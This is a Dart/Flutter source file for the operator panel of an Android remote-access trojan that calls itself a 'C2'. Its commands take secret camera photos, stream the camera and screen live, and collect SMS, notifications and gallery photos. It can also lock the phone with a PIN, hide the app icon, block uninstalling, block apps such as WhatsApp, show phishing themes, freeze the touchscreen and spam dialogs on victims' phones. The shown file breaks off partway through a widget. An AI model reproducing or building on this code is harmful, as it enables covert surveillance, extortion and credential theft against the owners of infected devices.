import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

const String baseUrl = "http://127.0.0.1:3143";

enum LogType { info, success, warning, error }
enum TabIndex { devices, control, messages }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, this.type = LogType.info});
}

// ─── MAIN PAGE ────────────────────────────────────────────────────────
class ControlPanelPage extends StatefulWidget {
  final Map<String, dynamic>? device;

  const ControlPanelPage({super.key, this.device});

  @override
  State<ControlPanelPage> createState() => _ControlPanelPageState();
}

class _ControlPanelPageState extends State<ControlPanelPage> with SingleTickerProviderStateMixin {
  // ─── STATE ────────────────────────────────────────────────────────────
  TabIndex _currentTab = TabIndex.devices;
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _isInit = false;

  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};

  // ─── DATA DEVICES ──────────────────────────────────────────────────
  List<dynamic> _devices = [];
  String? _sessionKey;
  Timer? _pollingTimer;

  // ─── DATA PESAN (SMS & NOTIF) ──────────────────────────────────────
  Map<String, dynamic> _smsData = {};
  Map<String, dynamic> _notifData = {};

  // ─── STREAM CAMERA ──────────────────────────────────────────────────
  final StreamController<String> _cameraFrameStreamController = StreamController<String>.broadcast();

  // ─── ANIMATION ──────────────────────────────────────────────────────
  late AnimationController _glowController;
  late AnimationController _rotateController;
  late Animation<double> _glowAnimation;
  late Animation<double> _rotateAnimation;

  // ─── TEMA: HITAM PREMIUM + BIRU TUA ───
  final Color _primaryColor   = const Color(0xFF90CAF9);
  final Color _secondaryColor = const Color(0xFF42A5F5);
  final Color _accentColor    = const Color(0xFF1E88E5);
  final Color _successColor   = const Color(0xFF4CAF50);
  final Color _warningColor   = const Color(0xFFFFA726);
  final Color _darkBg         = const Color(0xFF030508);
  final Color _darkerBg       = const Color(0xFF020306);
  final Color _surfaceColor   = const Color(0xFF090C12);
  final Color _cardColor      = const Color(0xFF0A0D14);
  final Color _glowColor1     = const Color(0xFF1565C0);
  final Color _glowColor2     = const Color(0xFF0D47A1);
  final Color _glowColor3     = const Color(0xFF00B4D8);
  final Color _goldColor      = const Color(0xFFFFC107);
  final Color _roseColor      = const Color(0xFFE91E63);

  // ─── CONTROLLERS ──────────────────────────────────────────────────
  final ScrollController _logScrollController = ScrollController();
  final TextEditingController _customCommandController = TextEditingController();
  final TextEditingController _customExtraController = TextEditingController();

  // ─── STATE KONTROL ──────────────────────────────────────────────────
  bool _isJumpscareActive = false;
  bool _isJumpscare2Active = false;
  bool _isDialogSpamActive = false;
  bool _isTouchBlocked = false;
  bool _isTtsSpeaking = false;
  bool _isVideoOverlayActive = false;
  bool _isLockCustomActive = false;
  bool _isAntiUninstallActive = false;
  String _jumpscareUrl = '';
  String _jumpscare2Url = '';
  int _jumpscare2Duration = 3000;
  List<String> _blockedApps = [];

  // ─── CAMERA & SCREEN MODAL STATE ──────────────────────────────────────
  bool _cameraModalVisible = false;
  String _cameraFrame = '';
  String _cameraFacing = 'front';
  bool _cameraLoading = true;

  bool _screenshotResultVisible = false;
  String _screenshotFrame = '';
  String _screenshotFacing = 'front';
  double _screenshotScale = 1.0;
  double _screenshotOffsetX = 0.0;
  double _screenshotOffsetY = 0.0;

  bool _screenModalVisible = false;
  String _screenFrame = '';
  bool _screenLoading = true;

  // ─── LOADING CONTEXTS ──────────────────────────────────────────────
  BuildContext? _locationLoadingContext;
  BuildContext? _notifLoadingContext;

  // ─── GALLERY STATE ──────────────────────────────────────────────────
  List<Map<String, dynamic>> _galleryPhotos = [];
  bool _isGalleryLoading = false;
  bool _galleryModalVisible = false;
  String _currentGalleryImage = '';
  int _currentGalleryIndex = 0;
  final StreamController<List<Map<String, dynamic>>> _galleryStreamController =
      StreamController<List<Map<String, dynamic>>>.broadcast();

  // ─── CAMERA SOCKET STATE ──────────────────────────────────────────
  bool _isWaitingForPhoto = false;
  BuildContext? _photoLoadingContext;

  // ─── DEKLARASI DI ATAS initState ──────────────────────────────────────
  late List<Map<String, dynamic>> _controlItems;

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _loadTokenAndFetch();
    _initSocket();
    _initCameraStream();
    _startPolling();

    // ─── INISIALISASI KONTROL ITEMS ──────────────────────────────────
    _controlItems = [
      // ── TOGGLE ON/OFF ──
      {
        "label": "Flash",
        "icon": Icons.flash_on,
        "color": Colors.yellow,
        "command": "flashlight",
        "isToggle": true,
        "isOn": _deviceData['flashlight'] ?? false,
        "needsInput": false,
      },
      {
        "label": "Lock Device",
        "icon": Icons.lock,
        "color": Colors.purple,
        "command": "lockDevice",
        "isToggle": true,
        "isOn": _deviceData['deviceLocked'] ?? false,
        "needsInput": true,
        "inputHint": "Pesan kunci (opsional)",
        "inputType": "text",
      },
      {
        "label": "Lock V2 (HTML)",
        "icon": Icons.lock_outline,
        "color": Colors.indigo,
        "command": "lockCustom",
        "isToggle": true,
        "isOn": _isLockCustomActive,
        "needsInput": true,
        "inputHint": "HTML untuk tampilan kunci",
        "inputType": "multiline",
      },
      {
        "label": "Hide Icon",
        "icon": Icons.visibility_off,
        "color": Colors.orange,
        "command": "hideIcon",
        "isToggle": true,
        "isOn": _deviceData['iconHidden'] ?? false,
        "needsInput": false,
      },
      {
        "label": "Mute Volume",
        "icon": Icons.volume_off,
        "color": Colors.red,
        "command": "muteVolume",
        "isToggle": true,
        "isOn": _deviceData['volumeMuted'] ?? false,
        "needsInput": false,
      },
      {
        "label": "Anti Uninstall",
        "icon": Icons.security,
        "color": Colors.teal,
        "command": "antiUninstall",
        "isToggle": true,
        "isOn": _isAntiUninstallActive,
        "needsInput": false,
      },
      // ── VIDEO OVERLAY (BARU) ──
      {
        "label": "Video Overlay",
        "icon": Icons.video_library,
        "color": Colors.pinkAccent,
        "command": "videoOverlay",
        "isToggle": true,
        "isOn": _isVideoOverlayActive,
        "needsInput": true,
        "inputHint": "URL video (misal: https://example.com/video.mp4)",
        "inputType": "text",
      },

      // ── TOMBOL AKSI ──
      {
        "label": "Unlock Device",
        "icon": Icons.lock_open,
        "color": Colors.green,
        "command": "unlockDevice",
        "isToggle": false,
        "needsInput": false,
        "extra": "",
      },
      {
        "label": "Stuck Layar",
        "icon": Icons.touch_app,
        "color": Colors.amber,
        "command": "touchBlock",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Durasi dalam detik (0 = ∞)",
        "inputType": "number",
        "extra": '{"duration": 0}',
      },
      {
        "label": "TTS",
        "icon": Icons.record_voice_over,
        "color": Colors.purpleAccent,
        "command": "ttsSpeak",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Teks untuk diucapkan",
        "inputType": "text",
        "extra": '{"text":"Halo, ini tes suara","lang":"id"}',
      },
      // ── KAMERA ──
      {
        "label": "Foto Depan",
        "icon": Icons.camera_front,
        "color": Colors.cyan,
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
      },
      {
        "label": "Foto Belakang",
        "icon": Icons.camera_rear,
        "color": Colors.cyan,
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
      },
      {
        "label": "Live Cam Depan",
        "icon": Icons.videocam,
        "color": Colors.blueAccent,
        "command": "liveCamera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
      },
      {
        "label": "Live Cam Belakang",
        "icon": Icons.videocam,
        "color": Colors.blueAccent,
        "command": "liveCamera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
      },
      // ── STOP CAMERA ──
      {
        "label": "Stop Camera",
        "icon": Icons.stop_circle,
        "color": Colors.red,
        "command": "stopCamera",
        "isToggle": false,
        "needsInput": false,
      },
      // ── STOP LIVE SCREEN ──
      {
        "label": "Stop Live Screen",
        "icon": Icons.stop_screen_share,
        "color": Colors.red,
        "command": "stopScreen",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Vibrate",
        "icon": Icons.vibration,
        "color": Colors.grey,
        "command": "vibrate",
        "isToggle": false,
        "needsInput": false,
        "extra": "500",
      },
      {
        "label": "Toast",
        "icon": Icons.message,
        "color": Colors.amber,
        "command": "showToast",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Pesan toast",
        "inputType": "text",
        "extra": "Pesan dari C2!",
      },
      {
        "label": "Spam Dialog",
        "icon": Icons.chat,
        "color": Colors.redAccent,
        "command": "dialogSpam",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Teks spam",
        "inputType": "text",
        "extra": '{"text":"SPAM dari C2!"}',
      },
      // ── APP BLOCK ──
      {
        "label": "Block App",
        "icon": Icons.block,
        "color": Colors.red,
        "command": "blockApp",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Package name (contoh: com.whatsapp)",
        "inputType": "text",
        "extra": '{"package":"com.whatsapp","name":"WhatsApp"}',
      },
      {
        "label": "Unblock App",
        "icon": Icons.check_circle,
        "color": Colors.green,
        "command": "unblockApp",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Package name (contoh: com.whatsapp)",
        "inputType": "text",
        "extra": "com.whatsapp",
      },
      {
        "label": "Unblock All",
        "icon": Icons.check_circle_outline,
        "color": Colors.greenAccent,
        "command": "unblockAll",
        "isToggle": false,
        "needsInput": false,
      },
      {
        "label": "Tema Phising",
        "icon": Icons.color_lens,
        "color": Colors.greenAccent,
        "command": "changeTheme",
        "isToggle": false,
        "needsInput": true,
        "inputHint": "Nama tema (whatsapp/instagram/etc)",
        "inputType": "text",
        "extra": "whatsapp",
      },
      {
        "label": "Live Screen",
        "icon": Icons.screen_share,
        "color": Colors.green,
        "command": "screen",
        "isToggle": false,
        "needsInput": false,
        "extra": "start",
      },
    ];

    // ─── LISTENER GALLERY STREAM ──────────────────────────────────────
    _galleryStreamController.stream.listen((photos) {
      if (mounted) {
        setState(() {
          _galleryPhotos = photos;
          _isGalleryLoading = false;
          _galleryModalVisible = true;
        });
        _addLog("🖼️ Gallery stream update: ${photos.length} foto", LogType.success);
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => GalleryFullscreenPage(
              targetId: _targetId,
              targetModel: _targetModel,
              galleryStream: _galleryStreamController.stream,
              onClose: _closeGalleryFullscreen,
              onRefresh: () {
                _sendCommand('getGallery');
                _addLog("🖼️ Refreshing gallery", LogType.info);
              },
              onDownload: _downloadScreenshot,
            ),
            fullscreenDialog: true,
          ),
        );
      }
    });
  }

  void _initializeAnimations() {
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2500),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _rotateController = AnimationController(
      duration: const Duration(seconds: 20),
      vsync: this,
    );
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
  }

  Future<void> _loadTokenAndFetch() async {
    final prefs = await SharedPreferences.getInstance();
    _sessionKey = prefs.getString("key");
    if (_sessionKey != null) {
      _fetchDevices();
    }
  }

  void _startPolling() {
    _pollingTimer = Timer.periodic(const Duration(seconds: 10), (timer) {
      _fetchDevices();
    });
  }

  Future<void> _fetchDevices() async {
    if (_sessionKey == null) return;
    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/list-targets"),
        headers: {"x-auth-token": _sessionKey!},
      );
      if (response.statusCode == 200 && mounted) {
        setState(() {
          _devices = jsonDecode(response.body);
        });
      }
    } catch (e) {
      debugPrint("Fetch devices error: $e");
    }
  }

  // ─── SOCKET ──────────────────────────────────────────────────────────
  void _initSocket() {
    try {
      socket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setPath('/socket.io')
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL', 'token': _sessionKey ?? ''})
            .enableAutoConnect()
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("✅ Sistem Kontrol Terhubung", LogType.success);
          _setupSocketListeners();
        }
      });

      socket.onDisconnect((_) {
        if (mounted) setState(() => _isConnected = false);
      });

      socket.connect();
    } catch (e) {
      _addLog("❌ Socket Error: $e", LogType.error);
    }
  }

  void _setupSocketListeners() {
    // ── DEVICES UPDATE ──
    socket.on('devices:update', (data) {
      if (mounted) {
        setState(() {
          _devices = List<dynamic>.from(data);
        });
      }
    });

    // ── SMS ──
    socket.on('device:sms', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() { _smsData = data; });
        _addLog("💬 SMS diterima", LogType.success);
        _showSmsData(data);
      }
    });

    // ── NOTIF ──
    socket.on('device:notif', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() { _notifData = data; });
        _addLog("🔔 Notifikasi diterima", LogType.success);
        _showNotifData(data);
      }
    });

    // ── CAMERA FRAME ──
    socket.on('camera:frame', (data) {
      if (data['deviceId'] == _targetId && data['frame'] != null) {
        final frame = data['frame'];
        _cameraFrameStreamController.add(frame);
        _addLog("📷 Camera frame received", LogType.info);

        if (_isWaitingForPhoto) {
          _isWaitingForPhoto = false;
          if (_photoLoadingContext != null) {
            try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
            _photoLoadingContext = null;
          }
          if (mounted) {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) => ScreenshotResultPage(
                  targetModel: _targetModel,
                  screenshotFrame: frame,
                  screenshotFacing: _cameraFacing,
                  onClose: () {
                    Navigator.pop(context);
                    _sendCommand('camera', extra: 'stop');
                  },
                ),
                fullscreenDialog: true,
              ),
            );
          }
        }
      }
    });

    // ── SCREEN FRAME ──
    socket.on('screen:frame', (data) {
      if (data['frame'] != null) {
        setState(() {
          _screenFrame = data['frame'];
          _screenLoading = false;
          _screenModalVisible = true;
        });
        _addLog("🖥️ Screen frame received", LogType.info);
      }
    });

    // ── COMMAND RESPONSE ──
    socket.on('command_response', (data) {
      if (data['deviceId'] == _targetId) {
        final cmd = data['command']?.toString() ?? '';
        final status = data['status']?.toString() ?? '';
        _addLog("📥 Response: $cmd → $status", LogType.info);
        switch (cmd) {
          case 'jumpscareStart': setState(() => _isJumpscareActive = status == 'started'); break;
          case 'jumpscareStop': setState(() => _isJumpscareActive = false); break;
          case 'jumpscare2Start': setState(() => _isJumpscare2Active = status == 'started'); break;
          case 'jumpscare2Stop': setState(() => _isJumpscare2Active = false); break;
          case 'dialogSpam': setState(() => _isDialogSpamActive = status == 'started'); break;
          case 'dialogSpamStop': setState(() => _isDialogSpamActive = false); break;
          case 'touchBlock': setState(() => _isTouchBlocked = status == 'started'); break;
          case 'touchBlockStop': setState(() => _isTouchBlocked = false); break;
          case 'ttsSpeak': setState(() => _isTtsSpeaking = status == 'started'); break;
          case 'ttsStop': setState(() => _isTtsSpeaking = false); break;
          case 'videoOverlay': setState(() => _isVideoOverlayActive = status == 'started'); break;
          case 'videoOverlayHide': setState(() => _isVideoOverlayActive = false); break;
          case 'lockCustom': setState(() { _isLockCustomActive = status == 'locked'; }); break;
          case 'blockApp': if (data['package'] != null && !_blockedApps.contains(data['package'])) setState(() => _blockedApps.add(data['package'])); break;
          case 'unblockApp': setState(() => _blockedApps.remove(data['package'])); break;
          case 'unblockAll': setState(() => _blockedApps.clear()); break;
          // Update toggle states
          case 'lockDevice':
            if (data['status'] == 'locked' || data['status'] == true) {
              setState(() { _deviceData['deviceLocked'] = true; _updateControlItemState('lockDevice', true); });
            } else {
              setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            }
            break;
          case 'unlockDevice':
            setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); });
            break;
          case 'hideIcon':
            setState(() {
              _deviceData['iconHidden'] = data['status'] == 'hidden';
              _updateControlItemState('hideIcon', data['status'] == 'hidden');
            });
            break;
          case 'muteVolume':
            setState(() {
              _deviceData['volumeMuted'] = data['status'] == 'muted';
              _updateControlItemState('muteVolume', data['status'] == 'muted');
            });
            break;
          case 'antiUninstall':
            setState(() {
              _isAntiUninstallActive = data['status'] == 'active';
              _updateControlItemState('antiUninstall', data['status'] == 'active');
            });
            break;
          case 'flashlight':
            setState(() {
              _deviceData['flashlight'] = data['status'] == 'on';
              _updateControlItemState('flashlight', data['status'] == 'on');
            });
            break;
        }
      }
    });
  }

  void _updateControlItemState(String command, bool value) {
    for (int i = 0; i < _controlItems.length; i++) {
      if (_controlItems[i]['command'] == command) {
        setState(() {
          _controlItems[i]['isOn'] = value;
        });
        break;
      }
    }
  }

  void _initCameraStream() {
    _cameraFrameStreamController.stream.listen((frame) {});
  }

  // ─── LOGGING ──────────────────────────────────────────────────────────
  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 200) _executionLogs.removeLast();
      });
    }
  }

  String _formatTime(DateTime time) => "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return _successColor;
      case LogType.error: return _roseColor;
      case LogType.warning: return _warningColor;
      default: return Colors.white70;
    }
  }

  // ─── COMMAND ──────────────────────────────────────────────────────────
  Future<void> _sendCommand(String command, {String? extra}) async {
    if (!_isConnected) {
      _addLog("⚠️ C2 Disconnected", LogType.warning);
      return;
    }
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Device ID tidak valid!", LogType.error);
      return;
    }
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key');
    if (token == null || token.isEmpty) {
      _addLog("❌ Token hilang! Login ulang.", LogType.error);
      if (mounted) Navigator.pushReplacementNamed(context, '/login');
      return;
    }

    setState(() => _isProcessing = true);
    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/command/$_targetId"),
        headers: {
          "Content-Type": "application/json",
          "x-auth-token": token,
        },
        body: jsonEncode({
          "command": command,
          "value": extra ?? "",
        }),
      );

      if (response.statusCode == 200) {
        _addLog("🚀 EXEC: $command", LogType.success);
      } else if (response.statusCode == 401) {
        _addLog("❌ Sesi kadaluarsa! Login ulang.", LogType.error);
        if (mounted) Navigator.pushReplacementNamed(context, '/login');
      } else {
        _addLog("❌ ERR: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ HTTP ERR: $e", LogType.error);
    } finally {
      if (mounted) setState(() => _isProcessing = false);
    }
  }

  // ─── DIALOG INPUT ────────────────────────────────────────────────────
  Future<String?> _showLockDeviceDialog() async {
    String pin = '';
    String lockTitle = '';
    String errorMessage = '';
    
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => AlertDialog(
          backgroundColor: _cardColor,
          title: Text(
            'SET DEVICE LOCK',
            style: const TextStyle(
              color: Colors.white,
              fontSize: 20,
              fontWeight: FontWeight.bold,
              letterSpacing: 2,
            ),
            textAlign: TextAlign.center,
          ),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const SizedBox(height: 12),
                Text(
                  'MASUKKAN PIN & JUDUL LOCK',
                  style: TextStyle(
                    color: Colors.white54,
                    fontSize: 10,
                    letterSpacing: 2,
                  ),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 20),
                
                // PIN Input Label
                Align(
                  alignment: Alignment.centerLeft,
                  child: Text(
                    'PIN 4 ANGKA',
                    style: TextStyle(
                      color: Colors.white54,
                      fontSize: 11,
                      fontWeight: FontWeight.w600,
                      letterSpacing: 1,
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                
                // PIN Display Boxes
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: List.generate(4, (index) {
                    return Container(
                      width: 52,
                      height: 60,
                      margin: const EdgeInsets.symmetric(horizontal: 5),
                      decoration: BoxDecoration(
                        border: Border.all(
                          color: Colors.blueAccent.withOpacity(0.3),
                          width: 1.5,
                        ),
                        borderRadius: BorderRadius.circular(12),
                        color: Colors.white.withOpacity(0.03),
                      ),
                      child: Center(
                        child: Text(
                          index < pin.length
                              ? '●'
                              : '—',
                          style: TextStyle(
                            color: Colors.blueAccent,
                            fontSize: index < pin.length ? 20 : 24,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    );
                  }),
                ),
                const SizedBox(height: 16),
                
                // Hidden PIN Input
                TextField(
                  inputFormatters: [
                    FilteringTextInputFormatter.digitsOnly,
                    LengthLimitingTextInputFormatter(4),
                  ],
                  keyboardType: TextInputType.number,
                  onChanged: (value) {
                    setState(() {
                      pin = value;
                      errorMessage = '';
                    });
                  },
                  style: const TextStyle(color: Colors.transparent),
                  decoration: InputDecoration(
                    isDense: true,
                    contentPadding: EdgeInsets.zero,
                    border: InputBorder.none,
                    enabledBorder: InputBorder.none,
                    focusedBorder: InputBorder.none,
                  ),
                  autofocus: true,
                ),
                
                // Numeric Keypad
                GridView.count(
                  crossAxisCount: 3,
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  padding: EdgeInsets.zero,
                  mainAxisSpacing: 8,
                  crossAxisSpacing: 8,
                  children: [
                    ...[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) {
                      return _buildKeypadButton(
                        '$num',
                        onPressed: () {
                          if (pin.length < 4) {
                            setState(() {
                              pin += '$num';
                              errorMessage = '';
                            });
                          }
                        },
                      );
                    }),
                    _buildKeypadButton(
                      '⌫',
                      onPressed: () {
                        if (pin.isNotEmpty) {
                          setState(() {
                            pin = pin.substring(0, pin.length - 1);
                            errorMessage = '';
                          });
                        }
                      },
                    ),
                  ],
                ),
                const SizedBox(height: 12),
                
                // Error Message
                if (errorMessage.isNotEmpty)
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                    child: Text(
                      errorMessage,
                      style: const TextStyle(
                        color: Colors.redAccent,
                        fontSize: 10,
                        letterSpacing: 1,
                      ),
                      textAlign: TextAlign.center,
                    ),
                  ),
                const SizedBox(height: 8),
                
                // Lock Title Label
                Align(
                  alignment: Alignment.centerLeft,
                  child: Text(
                    'JUDUL / PESAN LOCK',
                    style: TextStyle(
                      color: Colors.white54,
                      fontSize: 11,
                      fontWeight: FontWeight.w600,
                      letterSpacing: 1,
                    ),
                  ),
                ),
                const SizedBox(height: 8),
                
                // Lock Title Input
                TextField(
                  onChanged: (value) {
                    setState(() {
                      lockTitle = value;
                    });
                  },
                  maxLength: 60,
                  decoration: InputDecoration(
                    hintText: 'Contoh: Sistem Terkunci...',
                    hintStyle: TextStyle(color: Colors.white54, fontSize: 12),
                    counterText: '',
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: Colors.blueAccent.withOpacity(0.2), width: 1.5),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: BorderSide(color: Colors.blueAccent.withOpacity(0.2), width: 1.5),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Colors.blueAccent, width: 1.5),
                    ),
                  ),
                  style: const TextStyle(color: Colors.white, fontSize: 13),
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context, null),
              child: const Text("BATAL", style: TextStyle(color: Colors.white54)),
            ),
            ElevatedButton(
              onPressed: () {
                if (pin.length != 4) {
                  setState(() {
                    errorMessage = 'PIN harus 4 angka!';
                  });
                  return;
                }
                final lockData = jsonEncode({
                  'pin': pin,
                  'title': lockTitle.trim().isEmpty ? 'Perangkat Terkunci' : lockTitle.trim(),
                });
                Navigator.pop(context, lockData);
              },
              child: const Text("LOCK DEVICE"),
            ),
          ],
        ),
      ),
    );
  }

  Future<String?> _showInputDialog({
    required String title,
    required String hint,
    String initialValue = '',
    bool multiline = false,
    TextInputType keyboardType = TextInputType.text,
  }) async {
    final controller = TextEditingController(text: initialValue);
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: _cardColor,
        title: Text(title, style: const TextStyle(color: Colors.white)),
        content: multiline
            ? TextField(
          controller: controller,
          maxLines: 10,
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: TextStyle(color: Colors.white54),
            border: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)),
            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)),
            focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.blueAccent)),
          ),
          style: const TextStyle(color: Colors.white),
        )
            : TextField(
          controller: controller,
          keyboardType: keyboardType,
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: TextStyle(color: Colors.white54),
            border: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)),
            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)),
            focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.blueAccent)),
          ),
          style: const TextStyle(color: Colors.white),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, null),
            child: const Text("BATAL", style: TextStyle(color: Colors.white54)),
          ),
          ElevatedButton(
            onPressed: () {
              final value = controller.text.trim();
              Navigator.pop(context, value);
            },
            child: const Text("KIRIM"),
          ),
        ],
      ),
    );
  }

  // ─── KEYPAD BUTTON HELPER ──────────────────────────────────────────
  Widget _buildKeypadButton(String label, {required VoidCallback onPressed}) {
    return GestureDetector(
      onTap: onPressed,
      child: Container(
        decoration: BoxDecoration(
          border: Border.all(
            color: Colors.blueAccent.withOpacity(0.2),
            width: 1,
          ),
          borderRadius: BorderRadius.circular(12),
          color: Colors.blueAccent.withOpacity(0.05),
        ),
        child: Material(
          color: Colors.transparent,
          child: InkWell(
            onTap: onPressed,
            child: Center(
              child: Text(
                label,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ─── NAVIGASI TAB ──────────────────────────────────────────────────
  Widget _buildBottomNav() {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        border: Border(top: BorderSide(color: _glowColor1.withOpacity(0.1))),
      ),
      child: Padding(
        padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 16),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceAround,
          children: [
            _buildNavItem(Icons.phone_android_outlined, "Devices", TabIndex.devices),
            _buildNavItem(Icons.settings_outlined, "Control", TabIndex.control),
            _buildNavItem(Icons.chat_bubble_outline, "Pesan", TabIndex.messages),
          ],
        ),
      ),
    );
  }

  Widget _buildNavItem(IconData icon, String label, TabIndex tab) {
    bool isActive = _currentTab == tab;
    return GestureDetector(
      onTap: () {
        setState(() {
          _currentTab = tab;
        });
      },
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
            decoration: isActive
                ? BoxDecoration(
              color: Colors.blue.withOpacity(0.2),
              borderRadius: BorderRadius.circular(20),
            )
                : null,
            child: Icon(
              icon,
              color: isActive ? Colors.blueAccent : Colors.grey,
              size: 26,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            label,
            style: TextStyle(
              color: isActive ? Colors.blueAccent : Colors.grey,
              fontSize: 10,
              fontWeight: isActive ? FontWeight.bold : FontWeight.normal,
            ),
          ),
        ],
      ),
    );
  }

  // ─── BUILD TAB CONTENT ──────────────────────────────────────────────
  Widget _buildTabContent() {
    switch (_currentTab) {
      case TabIndex.devices:
        return _buildDevicesTab();
      case TabIndex.control:
        return _buildControlTab();
      case TabIndex.messages:
        return _buildMessagesTab();
    }
  }

  // ─── TAB: DEVICES ────────────────────────────────────────────────────
  Widget _buildDevicesTab() {
    return Column(
      children: [
        _buildDeviceHeader(),
        Expanded(
          child: _devices.isEmpty
              ? Center(child: Text("No Devices Found", style: TextStyle(color: Colors.white54)))
              : ListView.builder(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            itemCount: _devices.length,
            itemBuilder: (context, index) {
              final device = _devices[index];
              return _buildDeviceCard(device, index);
            },
          ),
        ),
      ],
    );
  }

  Widget _buildDeviceHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 16, 16, 8),
      child: Row(
        children: [
          Text(
            "DEVICES",
            style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold, letterSpacing: 2),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Container(
              height: 1,
              color: _glowColor1.withOpacity(0.3),
            ),
          ),
          const SizedBox(width: 8),
          Icon(Icons.help_outline, color: _glowColor2, size: 20),
        ],
      ),
    );
  }

  // ─── DEVICE CARD YANG LEBIH KECE ──────────────────────────────────
  Widget _buildDeviceCard(dynamic device, int index) {
    final bool isActive = device['status'] != 'Offline';
    final Color statusColor = isActive ? Colors.green : Colors.red;
    final String displayName = device['name'] ?? device['model'] ?? 'Unknown Device';
    final int battery = device['battery'] ?? 0;
    final String androidVersion = device['androidVersion'] ?? 'Unknown';
    final int sdkVersion = device['sdkVersion'] ?? 0;
